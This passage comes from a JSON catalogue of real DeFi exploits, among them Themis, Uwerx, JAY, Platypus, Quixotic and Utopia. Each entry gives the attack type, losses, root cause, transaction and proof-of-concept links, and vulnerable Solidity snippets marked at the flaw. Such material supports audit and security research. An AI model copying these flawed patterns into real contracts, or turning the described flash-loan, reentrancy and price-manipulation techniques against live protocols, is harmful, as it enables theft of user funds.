        "vulnerable_code_snippet": "function createLockedCampaign(\n    bytes16 id,\n    Campaign memory campaign,\n    ClaimLockup memory claimLockup,\n    Donation memory donation\n) external nonReentrant {\n    require(!usedIds[id], 'in use');\n    usedIds[id] = true;\n    require(campaign.token != address(0), '0_address');\n    require(campaign.manager != address(0), '0_manager');\n    require(campaign.amount > 0, '0_amount');\n    require(campaign.end > block.timestamp, 'end error');\n    require(campaign.tokenLockup != TokenLockup.Unlocked, '!locked');\n    require(claimLockup.tokenLocker != address(0), 'invalide locker');\n    TransferHelper.transferTokens(campaign.token, msg.sender, address(this), campaign.amount + donation.amount);\n    if (donation.amount > 0) {\n      if (donation.start > 0) {\n        SafeERC20.safeIncreaseAllowance(IERC20(campaign.token), donation.tokenLocker, donation.amount); // <--- vulnerable point\n        ILockupPlans(donation.tokenLocker).createPlan(\n          donationCollector,\n          campaign.token,\n          donation.amount,\n          donation.start,\n          donation.cliff,\n          donation.rate,\n          donation.period\n        );\n      } else {\n        TransferHelper.withdrawTokens(campaign.token, donationCollector, donation.amount);\n      }\n      emit TokensDonated(id, donationCollector, campaign.token, donation.amount, donation.tokenLocker);\n    }\n    claimLockups[id] = claimLockup;\n    SafeERC20.safeIncreaseAllowance(IERC20(campaign.token), claimLockup.tokenLocker, campaign.amount);\n    campaigns[id] = campaign;\n    emit ClaimLockupCreated(id, claimLockup);\n    emit CampaignStarted(id, campaign);\n}"
    },
    {
        "type": "Price Manipulation",
        "date": "20230628",
        "title": "Themis",
        "root_cause": "The LP token price is determined by aggregating the total value of all tokens in the pool. In this case, the attacker managed to manipulate the oracle by exchanging tokens within the Balancer pool, leading to the hack.",
        "attack_tx": "https://arbiscan.io/tx/0xff368294ccb3cd6e7e263526b5c820b22dea2b2fd8617119ba5c3ab8417403d8",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/Themis_exp.sol",
        "analysis": [
            "https://twitter.com/BeosinAlert/status/1673930979348717570",
            "https://twitter.com/BlockSecTeam/status/1673897088617426946"
        ],
        "Lost": "$370k"
    },
    {
        "type": "Flashloans, Price Manipulation",
        "date": "20230707",
        "lost": "9464USDT",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main//src/test/2023-07/LUSD_exp.sol",
        "title": "LUSD",
        "root_cause": "the loan contract use getAmountsOut to calculate how many lusd should be mint,and the hacker manipulate the BTCB-BSC-USD pool, borrow 1BTC and return 800k BSC-USD,so the loan contract will mint extra lusd",
        "vulnerable_code_snippet": "function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);",
        "attack_tx": "https://explorer.phalcon.xyz/tx/bsc/0x1eeef7b9a12b13f82ba04a7951c163eb566aa048050d6e9318b725d7bcec6bfa"
    },
    {
        "type": "Price Manipulation",
        "date": "20230802",
        "title": "Uwerx",
        "root_cause": "The attacker exploited the ability to burn UWERX tokens, decreasing the total supply and raising the token price artificially. They borrowed 20,000 ETH via flash loans, exchanged it for 5,053,637 UWERX tokens, and used the private _transfer() function to burn 1% of transferred tokens. This reduction in supply allowed them to sell UWERX tokens at a higher price, resulting in a profit.",
        "attack_tx": [
            "https://etherscan.io/tx/0x3b19e152943f31fe0830b67315ddc89be9a066dc89174256e17bc8c2d35b5af8",
            "https://explorer.phalcon.xyz/tx/eth/0x3b19e152943f31fe0830b67315ddc89be9a066dc89174256e17bc8c2d35b5af8"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-08/Uwerx_exp.sol",
        "analysis": "https://twitter.com/deeberiroz/status/1686683788795846657",
        "vulnerable_code_snippet": "function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(from, to, amount);\n\n        uint256 fromBalance = _balances[from];\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        unchecked {\n            _balances[from] = fromBalance - amount;\n            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by\n            // decrementing then incrementing.\n            _balances[to] += amount;\n        }\n        if (to == uniswapPoolAddress) {\n            uint256 userTransferAmount = (amount * 97) / 100;\n            uint256 marketingAmount = (amount * 2) / 100;\n            uint256 burnAmount = amount - userTransferAmount - marketingAmount;\n\n            emit Transfer(from, to, userTransferAmount);\n            emit Transfer(from, marketingWalletAddress, marketingAmount);\n            _burn(from, burnAmount);\n\n        } else {\n            emit Transfer(from, to, amount);\n        }\n        \n        _afterTokenTransfer(from, to, amount);\n    }"
    },
    {
        "type": "Price Manipulation",
        "date": "20240305",
        "lost": "8M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/Woofi_exp.sol",
        "title": "Woofi",
        "root_cause": "Price of `WOO` can be manipulated in `WooPPV2`",
        "attack_tx": "https://arbiscan.io/tx/0x57e555328b7def90e1fc2a0f7aa6df8d601a8f15803800a5aaf0a20382f21fbd",
        "analysis": "https://twitter.com/spreekaway/status/1765046559832764886"
    },
    {
        "type": "Deflationary token, Insufficient validation, Yield",
        "date": "20210912",
        "title": "ZABU Finance",
        "root_cause": "Incorrect calculation. A significant issue was the inadequate accounting mechanism, which recorded the full amount of tokens a user intended to deposit without accounting for transaction fees, leading to discrepancies between the tokens deposited and those actually received. This flaw allowed the attacker to exploit flash loans, manipulating the deposit and withdrawal processes without substantial capital. Additionally, the deflationary nature of the SPORE token exacerbated the problem, as it reduced the effective token amount received by the contract during transfers. The withdrawal mechanism permitted users to withdraw based on the inflated staking records rather than actual holdings, enabling the attacker to extract more tokens than they had staked. Lastly, insufficient validation checks further facilitated the exploit, as the contract did not ensure that the tokens deposited matched the actual tokens received, ultimately allowing the attacker to manipulate the reward calculation based on overstated staking amounts.",
        "lost": "$3.2 M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20210912-zabu-finance---deflationary-token-uncompatible",
        "attack_tx": null,
        "analysis": "Due to SPORE is a deflationary token\n1.Deposit SPORE tokens to DefilyFarm to deduct SPORE token in DefilyFarm contract.\n2.Until lp token balance in contract is 2. Then calculate a big reward value in updatePool function.\n",
        "vulnerable_code": [
            "https://snowtrace.io/address/0x6e7f5c0b9f4432716bdd0a77a3601291b9d9e985#code#L575",
            "https://github.com/SunWeb3Sec/DeFiHackLabs#20210912-zabu-finance---deflationary-token-uncompatible"
        ],
        "vulnerable_code_snippet":"function _transfer(address sender, address recipient, uint256 amount) private {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        require(amount > 0, \"Transfer amount must be greater than zero\");\n        if (block.timestamp < allowTradeAt + 24 hours && amount >= 10**6 * 10**9 ) {\n             revert(\"You cannot transfer more than 1 billion now\");  }\n        if (_isExcluded[sender] && !_isExcluded[recipient]) {\n            _transferFromExcluded(sender, recipient, amount);\n        } else if (!_isExcluded[sender] && _isExcluded[recipient]) {\n            _transferToExcluded(sender, recipient, amount);\n        } else if (!_isExcluded[sender] && !_isExcluded[recipient]) {\n            _transferStandard(sender, recipient, amount);\n        } else if (_isExcluded[sender] && _isExcluded[recipient]) {\n            _transferBothExcluded(sender, recipient, amount);\n        } else {\n            _transferStandard(sender, recipient, amount);\n        }\n    }\n    function _transferStandard(address sender, address recipient, uint256 tAmount) private {\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);       \n        _reflectFee(rFee, tFee);\n        emit Transfer(sender, recipient, tTransferAmount);\n    }\n\n    function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\n        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);           \n        _reflectFee(rFee, tFee);\n        emit Transfer(sender, recipient, tTransferAmount);\n    }\n\n    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n        _tOwned[sender] = _tOwned[sender].sub(tAmount);\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   \n        _reflectFee(rFee, tFee);\n        emit Transfer(sender, recipient, tTransferAmount);\n    }\n\n    function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n        _tOwned[sender] = _tOwned[sender].sub(tAmount);\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\n        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);        \n        _reflectFee(rFee, tFee);\n        emit Transfer(sender, recipient, tTransferAmount);\n    }\n\n    // Deposit LP tokens to DefilyFarm for reward allocation.\n    function deposit(uint256 _pid, uint256 _amount) public {\n        PoolInfo storage pool = poolInfo[_pid];\n        UserInfo storage user = userInfo[_pid][msg.sender];\n        updatePool(_pid);\n        if (user.amount > 0) {\n            uint256 pending = user.amount.mul(pool.accRewardPerShare).div(1e12).sub(user.rewardDebt);\n            safeTokenTransfer(msg.sender, pending);\n        }\n        pool.lpToken.safeTransferFrom(address(msg.sender), address(this), _amount);\n        user.amount = user.amount.add(_amount);\n        user.rewardDebt = user.amount.mul(pool.accRewardPerShare).div(1e12);\n        emit Deposit(msg.sender, _pid, _amount);\n    }\n\n    // Update reward variables of the given pool to be up-to-date.\n    function updatePool(uint256 _pid) public {\n        PoolInfo storage pool = poolInfo[_pid];\n        if (block.number <= pool.lastRewardBlock) {\n            return;\n        }\n        uint256 lpSupply = pool.lpToken.balanceOf(address(this));\n        if (lpSupply == 0) {\n            pool.lastRewardBlock = block.number;\n            return;\n        }\n        uint256 multiplier = getMultiplier(pool.lastRewardBlock, block.number);\n        uint256 reward = multiplier.mul(rewardPerBlock).mul(pool.allocPoint).div(totalAllocPoint);\n        safeTokenTransferReward(reward);\n        pool.accRewardPerShare = pool.accRewardPerShare.add(reward.mul(1e12).div(lpSupply)); //vulnerable point\n        pool.lastRewardBlock = block.number;\n    }"
    },
    {
        "type": "Insufficient validation, Reentrancy",
        "date": "20221229",
        "lost": "15.32 ETH",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/JAY_exp.sol",
        "title": "JAY",
        "root_cause": "Reentrancy. The attacker exploits this vulnerability to reenter the JAY contract. Specifically, the attacker first borrows 72.5 ETH for flash loan and uses 22 ETH to buy JAY token. Then he uses another 50.5 ETH to call the buyJay function, passing the fake ERC-721 token. In the transferFrom function of the fake ERC-721 token, the attacker reenters the JAY contract by calling the sell function, selling all the JAY token. As the Ether balance has been increased at the start of the buyJay function, the JAY token price is manipulated. The attacker repeated the procedure twice in a single transaction, with a total profit of 15.32 Ether.",
        "analysis": "https://twitter.com/BlockSecTeam/status/1608372475225866240",
        "attack_tx": "https://etherscan.io/tx/0xd4fafa1261f6e4f9c8543228a67caf9d02811e4ad3058a2714323964a8db61f6",
        "vulnerable_code_snippet": "function buyJay(\n        address[] calldata erc721TokenAddress,\n        uint256[] calldata erc721Ids,\n        address[] calldata erc1155TokenAddress,\n        uint256[] calldata erc1155Ids,\n        uint256[] calldata erc1155Amounts\n    ) public payable {\n        require(start, \"Not started!\");\n        uint256 total = erc721TokenAddress.length;\n        if (total != 0) buyJayWithERC721(erc721TokenAddress, erc721Ids);\n\n        if (erc1155TokenAddress.length != 0)\n            total = total.add(\n                buyJayWithERC1155(\n                    erc1155TokenAddress,\n                    erc1155Ids,\n                    erc1155Amounts\n                )\n            );\n\n        if (total >= 100)\n            require(\n                msg.value >= (total).mul(sellNftFeeEth).div(2),\n                \"You need to pay ETH more\"\n            );\n        else\n            require(\n                msg.value >= (total).mul(sellNftFeeEth),\n                \"You need to pay ETH more\"\n            );\n\n        _mint(msg.sender, ETHtoJAY(msg.value).mul(97).div(100));\n\n        (bool success, ) = dev.call{value: msg.value.div(34)}(\"\");\n        require(success, \"ETH Transfer failed.\");\n\n        nftsSold += total;\n\n        emit Price(block.timestamp, JAYtoETH(1 * 10**18));\n    }\n\nfunction JAYtoETH(uint256 value) public view returns (uint256) {\n        return (value * address(this).balance).div(totalSupply());\n    }"

    },
    {
        "type": "Access Control",
        "date": "20230615",
        "title": "DEPUSDT_LEVUSDC",
        "root_cause": "A public function that enabled the attacker to obtain approval as a spender for $DEPUSDT and $LEVUSDC tokens.",
        "attack_tx": {
            "DEPUSDT": "https://etherscan.io/tx/0xf0a13b445674094c455de9e947a25bade75cac9f5176695fca418898ea25742f",
            "LEVUSDC": "https://etherscan.io/tx/0x800a5b3178f680feebb81af69bd3dff791b886d4ce31615e601f2bb1f543bb2e"
        },
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/DEPUSDT_LEVUSDC_exp.sol",
        "analysis": "https://blog.solidityscan.com/depusdt-and-levusdc-hack-analysis-d27032d8f2cd",
        "lost": "$105k",
        "vulnerable_code_snippet": "function approveToken(address token, address spender, uint _amount) public returns (bool) {\n    IERC20(token).safeApprove(spender, _amount);\n    return true;\n}"
    },
    {
        "type": "Price Manipulation",
        "date": "20230724",
        "lost": "$900K",
        "title": "Palmswap",
        "root_cause": "The root cause is that the price of `$PLP`  is determined by the number of `$USDT` in the Vault contract and the $USDP supply. \nThe attacker was able to manipulate the amount of `$USDT` in the Vault by calling the `buyUSDP`function.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/Palmswap_exp.sol",
        "attack_tx": "https://app.blocksec.com/explorer/tx/bsc/0x62dba55054fa628845fecded658ff5b1ec1c5823f1a5e0118601aa455a30eac9",
        "analysis": "https://twitter.com/BlockSecTeam/status/1683680026766737408",
        "vulnerable_code_snippet": "function buyUSDP(address _receiver)\nexternal\n\noverride\n\nnonReentrant\n\nreturns (uint256)\n\n_increaseUsdpAmount(mintAmount);\n_increasePoolAmount(tokenAmount);\n\nIUSDP(usdp).mint(_receiver, mintAmount);\nemit BuyUSDP(_receiver, tokenAmount, mintAmount, feeBasisPoints);\n\nuseSwapPricing = false;\nreturn mintAmount;\n\nfunction _increasePoolAmount(uint256 _amount) private {\n\npoolAmount += _amount;\nuint256 balance = IERC20Upgradeable(collateralToken).balanceOf(\naddress(this));\n\n_validate(poolAmount <= balance, 40);\nemit IncreasePoolAmount(_amount);\n} ... function getAumInUsdp(bool maximise) public view override returns (uint256) {\n    uint256 aum = getAum(maximise);\n    return (aum * (10**USDP_DECIMALS)) / PRICE_PRECISION;\n}\n\nIVault _vault = vault;\nuint256 collateralTokenPrice = _vault.getMaxPrice(collateralToken);\nuint256 minPrice = _vault.getMinPrice(collateralToken);\nuint256 collateralDecimals = _vault.tokenDecimals(collateralToken);\n\nuint256 currentAum = (_vault.permanentPoolAmount() * collateralTokenPrice) / (10**collateralDecimals);\n// the poolAmount is manipulated via buyUSDP\n// lift the price of the PLP"
    },
    {
        "type": "Price Manipulation, Reentrancy",
        "date": "20231130",
        "title": "CAROLProtocol",
        "lost": "$53k",
        "root_cause": "The `Carol::sell` function can be re-entered due to the lack of a reentrancy guard, allowing the attacker to swap more CAROL for WETH in each recursive call. The `getTokenLiquidity()` function will then return a disproportionate result, leading to the manipulation of `ethReserved`.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/CAROLProtocol_exp.sol",
        "attack_tx": {
            "preparation": "0x6462f5e358eb2c7769e6aa59ce43277be4799b297bc4c9503610443b9d56cc24",
            "attack": "0xd962d397a7f8b3aadce1622e705b9e33b430e86e0d306d6fb8ccbc5957b4185c"
        },
        "analysis": "https://x.com/MetaSec_xyz/status/1730496513359647167",
        "vulnerable_code_snippet": "function sell(uint256 tokensAmount) external {\n    require(userBalance(msg.sender) >= tokensAmount, \"Sell: insufficient balance\");\n\n    collect(msg.sender);\n    Models.User storage user = users;\n    path[0] = TOKEN_ADDRESS;\n    path[1] = Constants.WRAPPED_ETH;\n\n    CAROLToken(TOKEN_ADDRESS).mint(address(this), tokensAmount);\n    CAROLToken(TOKEN_ADDRESS).increaseAllowance(UNISWAP_ROUTER_ADDRESS, tokensAmount);\n\t\t\n\t\t// Vulnerable Code Section\n    uint256[] memory amounts = IUniswapV2Router01(UNISWAP_ROUTER_ADDRESS).swapExactTokensForETH(\n      tokensAmount,\n      0,\n      path,\n      msg.sender,\n      block.timestamp + 5 minutes\n    );\n    uint256 ethAmount = amounts[1];\n    \n\n    (uint256 ethReserved, ) = getTokenLiquidity();\n    uint256 liquidity = ERC20(LP_TOKEN_ADDRESS).totalSupply()\n      * ethAmount\n      * (Constants.PERCENTS_DIVIDER + PRICE_BALANCER_PERCENT)\n      / Constants.PERCENTS_DIVIDER\n      / ethReserved;\n\n    ERC20(LP_TOKEN_ADDRESS).approve(\n      UNISWAP_ROUTER_ADDRESS,\n      liquidity\n    );\n\n    (, uint256 amountETH) = IUniswapV2Router01(UNISWAP_ROUTER_ADDRESS).removeLiquidityETH(\n      TOKEN_ADDRESS,\n      liquidity, \n      0, \n      0, \n      address(this),\n      block.timestamp + 5 minutes\n    );\n\n    path[0] = Constants.WRAPPED_ETH;\n    path[1] = TOKEN_ADDRESS;\n    amounts = IUniswapV2Router01(UNISWAP_ROUTER_ADDRESS).swapExactETHForTokens {value: amountETH} (\n      0,\n      path,\n      address(this),\n      block.timestamp + 5 minutes\n    );\n\n    emit Events.Sell(\n      msg.sender, tokensAmount, ethAmount, block.timestamp\n    );\n  }"
    },
    {
        "type": "Dex/AMM",
        "date": "20221001",
        "title": "BabySwap",
        "root_cause": "Insufficient validation",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20221001-babyswap---parameter-access-control",
        "attack_tx": null,
        "analysis": "Attacker created fake factory contract to get real reward tokens.nVulnerable code snippet:\nhttps://bscscan.com/address/0x5c9f1A9CeD41cCC5DcecDa5AFC317b72f1e49636#code#F4#L236\nhttps://bscscan.com/address/0x8317c460c22a9958c27b4b6403b98d2ef4e2ad32#code#F14#L89",
        "vulnerable_code_snippet": "function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] memory path,\n        address[] memory factories,\n        uint[] memory fees,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) returns (uint[] memory amounts) {\n        amounts = BabyLibrarySmartRouter.getAggregationAmountsOut(factories, fees, amountIn, path);\n        require(amounts[amounts.length - 1] >= amountOutMin, 'BabyRouter: INSUFFICIENT_OUTPUT_AMOUNT');\n        amounts[0] = routerFee(factories[0], msg.sender, path[0], amounts[0]);\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, BabyLibrarySmartRouter.pairFor(factories[0], path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, factories, to); **//vulnerable point -** Insufficient validation\n    } ... // swapMining only router\n    function swap(address account, address input, address output, uint256 amount) public onlyRouter returns (bool) {\n        require(account != address(0), \"SwapMining: taker swap account is the zero address\");\n        require(input != address(0), \"SwapMining: taker swap input is the zero address\");\n        require(output != address(0), \"SwapMining: taker swap output is the zero address\");\n\n        if (poolLength() <= 0) {\n            return false;\n        }\n\n        if (!isWhitelist(input) || !isWhitelist(output)) {\n            return false;\n        }\n\n        address pair = BabyLibrary.pairFor(address(factory), input, output);\n        PoolInfo storage pool = poolInfo[pairOfPid[pair]];\n        // If it does not exist or the allocPoint is 0 then return\n        if (pool.pair != pair || pool.allocPoint <= 0) {\n            return false;\n        }\n\n        uint256 quantity = getQuantity(output, amount, targetToken);\n        if (quantity <= 0) {\n            return false;\n        }\n\n        mint(pairOfPid[pair]);\n\n        pool.quantity = pool.quantity.add(quantity);\n        pool.totalQuantity = pool.totalQuantity.add(quantity);\n        UserInfo storage user = userInfo[pairOfPid[pair]][account];\n        user.quantity = user.quantity.add(quantity);\n        user.blockNumber = block.number;\n        return true;\n    }",
        "additional_info": null
    },
    {
        "type": "Business Logic Flaw, Flashloans",
        "date": "20231012",
        "title": "Platypus",
        "root_cause": "The `MasterPlatypusV4::emergencyWithdraw` function checks solvency before updating LP tokens, allowing users to withdraw funds even if they are used as collateral for a debt. In contrast, the `MasterPlatypusV4::withdraw` function checks solvency after updating the LP tokens, preventing this issue. To fix the `emergencyWithdraw` function, the solvency check should be reordered to occur after setting the user's amount to 0 or use the debt amount from `PlatypusTreasure::isSolvent` to ensure no active debt.\n\nThe attack originated from incorrect integration of `MasterPlatypusV4` with `PlatypusTreasure`, where the solvency check order allowed collateral to be withdrawn with active debt, creating 'bad debt' and resulting in the exchange of USP tokens for stable coins.",
        "attack_tx": "https://snowtrace.io/tx/0x4425f757715e23d392cda666bc0492d9e5d5848ff89851a1821eab5ed12bb867",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/Platypus03_exp.sol",
        "analysis": [
            "https://twitter.com/BlockSecTeam/status/1712445197538468298",
            "https://twitter.com/peckshield/status/1712354198246035562"
        ],
        "lost": "$2M",
        "vulnerable_code_snippet": "// @notice Withdraw without caring about rewards. EMERGENCY ONLY.\n\n/// @param _pid the pool id\nfunction emergencyWithdraw(uint256 _pid) public nonReentrant {\n    PoolInfo storage pool = poolInfo[_pid];\n    if (address(platypusTreasure) != address(0)) {\n        (bool isSolvent, ) = platypusTreasure.isSolvent(msg.sender, address(poolInfo[_pid].lpToken), true);\n        require(isSolvent, 'remaining amount exceeds collateral factor');\n    }\n\n    // reset rewarder before we update lpSupply and sumOfFactors\n    IBoostedMultiRewarder rewarder = pool.rewarder;\n    if (address(rewarder) != address(0)) {\n        rewarder.onPtpReward(msg.sender, user.amount, 0, user.factor, 0);\n    }\n\n    // SafeERC20 is not needed as Asset will revert if transfer fails\n    pool.lpToken.transfer(address(msg.sender), user.amount);\n\n    // update non-dialuting factor returns all the users deposit, even they have debt\n    pool.sumOfFactors -= user.factor;\n    user.amount = 0;\n    user.factor = 0;\n    user.rewardDebt = 0;\n\n    emit EmergencyWithdraw(msg.sender, _pid, user.amount);\n}"
    },
    {
        "type": "Insufficient validation",
        "date": "20220701",
        "title": "Quixotic",
        "root_cause": "fillSellOrder function only check seller signature.",
        "attack_tx": null,
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220701-quixotic---optimism-nft-marketplace",
        "analysis": "Quixotic only check buyers signature only.",
        "vulnerable_code": "https://optimistic.etherscan.io/address/0x065e8a87b8f11aed6facf9447abe5e8c5d7502b6#code#L1670",
        "lost": "$100K",
        "vulnerable_code_snippet": "/*\n    * @dev External trade function. This accepts the details of the sell order and signed sell\n    * order (the signature) as a meta-transaction.\n    *\n    * Emits a {SellOrderFilled} event via `_fillSellOrder`.\n    */\n    function fillSellOrder(\n        address payable seller,\n        address contractAddress,\n        uint256 tokenId,\n        uint256 startTime,\n        uint256 expiration,\n        uint256 price,\n        uint256 quantity,\n        uint256 createdAtBlockNumber,\n        address paymentERC20,\n        bytes memory signature,\n        address payable buyer\n    ) external payable whenNotPaused nonReentrant {\n        // If the payment ERC20 is the zero address, we check that enough native ETH has been sent\n        // with the transaction. Otherwise, we use the supplied ERC20 payment token.\n        if (paymentERC20 == address(0)) {\n            require(msg.value >= price, \"Transaction doesn't have the required ETH amount.\");\n        } else {\n            _checkValidERC20Payment(buyer, price, paymentERC20);\n        }\n\n        SellOrder memory sellOrder = SellOrder(\n            seller,\n            contractAddress,\n            tokenId,\n            startTime,\n            expiration,\n            price,\n            quantity,\n            createdAtBlockNumber,\n            paymentERC20\n        );\n\n        /* Make sure the order is not cancelled */\n        require(\n            cancellationRegistry.getSellOrderCancellationBlockNumber(seller, contractAddress, tokenId) < createdAtBlockNumber,\n            \"This order has been cancelled.\"\n        );\n\n        /* Check signature */\n        require(_validateSellerSignature(sellOrder, signature), \"Signature is not valid for SellOrder.\"); //vulnerable point\n\n        // Check has started\n        require((block.timestamp > startTime), \"SellOrder start time is in the future.\");\n\n        // Check not expired\n        require((block.timestamp < expiration), \"This sell order has expired.\");\n\n        _fillSellOrder(sellOrder, buyer);\n    }"
    },
    {
        "type": "Business Logic Flaw, Flashloans, Price Manipulation",
        "date": "20230402",
        "lost": "$550k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Allbridge_exp.sol",
        "title": "Allbridge",
        "root_cause": "QuillAudits: The root cause of the issue was a logic flaw in the withdraw function. This flaw allowed for manipulation of the swap price of the pool. The exploiter acted as a liquidity provider and swapper, enabling them to manipulate the price and drain the funds from the pool.",
        "attack_tx": "https://bscscan.com/tx/0x7ff1364c3b3b296b411965339ed956da5d17058f3164425ce800d64f1aef8210",
        "analysis": [
            "https://twitter.com/peckshield/status/1642356701100916736",
            "https://twitter.com/BeosinAlert/status/1642372700726505473",
            "https://medium.com/coinmonks/decoding-allbridge-570k-flash-loan-exploit-quillaudits-8da8dccd729d"
        ],
        "vulnerable_code_snippet":"// Subtract X and Y for that amount, calculate current price and withdraw the token to the user according to the price\n    function withdraw(uint256 amountLp) external {\n        uint256 totalLpAmount_ = totalLpAmount; // Gas optimization\n\n        _withdrawLp(msg.sender, amountLp);\n\n        // Calculate actual and virtual tokens using burned LP amount share\n        // Swap the difference, get total amount to transfer/burn\n        uint256 amountSP = _preWithdrawSwap(\n            tokenBalance * amountLp / totalLpAmount_, \n            vUsdBalance * amountLp / totalLpAmount_\n        );\n\n        // Always equal amounts removed from actual and virtual tokens\n        tokenBalance -= amountSP;\n        vUsdBalance -= amountSP;\n        \n        // Update D and transfer tokens to the sender\n        _updateD();\n        token.safeTransfer(msg.sender, fromSystemPrecision(amountSP));\n    }"
    },
    {
        "type": "Price Manipulation",
        "date": "20221105",
        "lost": "16WBNB",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/BDEX_exp.sol",
        "title": "BDEX",
        "root_cause": "The underlying issue stems from the fact that the `convertDustToEarned` function within the `BvaultsStrategy` contract lacks price checks. This deficiency becomes particularly problematic for trading pairs with low liquidity, as they are more susceptible to experiencing significant price changes due to variations in trading volume.",
        "vulnerable_code": "https://bscscan.com/address/0xB2B1DC3204ee8899d6575F419e72B53E370F6B20#code",
        "attack_tx": "https://bscscan.com/tx/0xe7b7c974e51d8bca3617f927f86bf907a25991fe654f457991cbf656b190fe94",
        "analysis": "https://twitter.com/BeosinAlert/status/1588579143830343683",
        "vulnerable_code_snippet": "function convertDustToEarned() public whenNotPaused {\n        require(isAutoComp, \"!isAutoComp\");\n\n        // Converts dust tokens into earned tokens, which will be reinvested on the next earn().\n\n        // Converts token0 dust (if any) to earned tokens\n        uint256 _token0Amt = IERC20(token0Address).balanceOf(address(this));\n        if (token0Address != earnedAddress && _token0Amt > 0) {\n            _vswapSwapToken(token0Address, earnedAddress, _token0Amt);\n        }\n\n        // Converts token1 dust (if any) to earned tokens\n        uint256 _token1Amt = IERC20(token1Address).balanceOf(address(this));\n        if (token1Address != earnedAddress && _token1Amt > 0) {\n            _vswapSwapToken(token1Address, earnedAddress, _token1Amt);\n        }\n    }"
    },
    {
        "type": "Insufficient validation, lending",
        "date": "20220322",
        "title": "Compound",
        "root_cause": "Insufficient validation. If the contract can make calls into arbitrary addresses, this can be abused. Attacker use legacy TUSD smart contract to trick compound.",
        "attack_tx": null,
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220322-compoundtusdsweeptokenbypass",
        "analysis": "if contract can make calls into arbitrary addresses, this can be abused. Attacker use legacy TUSD smart contract to trick compound.",
        "vulnerable_code": "https://etherscan.io/address/0xa035b9e130f2b1aedc733eefb1c67ba4c503491f#code#F1#L120",
        "vulnerable_code_snippet": "function sweepToken(EIP20NonStandardInterface token) override external {\n    require(address(token) != underlying, \"CErc20::sweepToken: can not sweep underlying token\");\n    uint256 balance = token.balanceOf(address(this));\n    token.transfer(admin, balance);\n}"
    },
    {
        "type": "Bad randomness",
        "date": "20230720",
        "title": "Utopia",
        "root_cause": "The root Cause is that the balance of the address can be set in the _airdrop() function, but the airdropAddress is not random, and the attacker can set the balance of the pair to 1 by calculating the receiver's address.",
        "attack_tx": "https://bscscan.com/tx/0xeb4eb487f58d39c05778fed30cd001b986d3c52279e44f46b2de2773e7ee1d5e",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/Utopia_exp.sol",
        "analysis": "https://twitter.com/DeDotFiSecurity/status/1681923729645871104",
        "lost": "$119k",
        "vulnerable_code_snippet": "function _airdrop(address from, address to, uint256 tAmount) private {\n    uint256 seed = (uint160(lastAirdropAddress) | block.number) ^ (uint160(from) ^ uint160(to));\n    address airdropAddress;\n    uint256 num = 1;\n    uint256 airdropAmount = 1;\n    for (uint256 i; i < num;) {\n        airdropAddress = address(uint160(seed | tAmount));\n        _balances[airdropAddress] = airdropAmount;\n        emit Transfer(airdropAddress, airdropAddress, airdropAmount);\n        unchecked {\n            ++i;\n            seed = seed >> 1;\n        }\n    }\n    lastAirdropAddress = airdropAddress;\n}"
    },
    {
        "type": "Insufficient validation, Yield",
        "date": "20201121",
        "lost": "$20 M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20201121-pickle-finance",
        "title": "Pickle Finance",
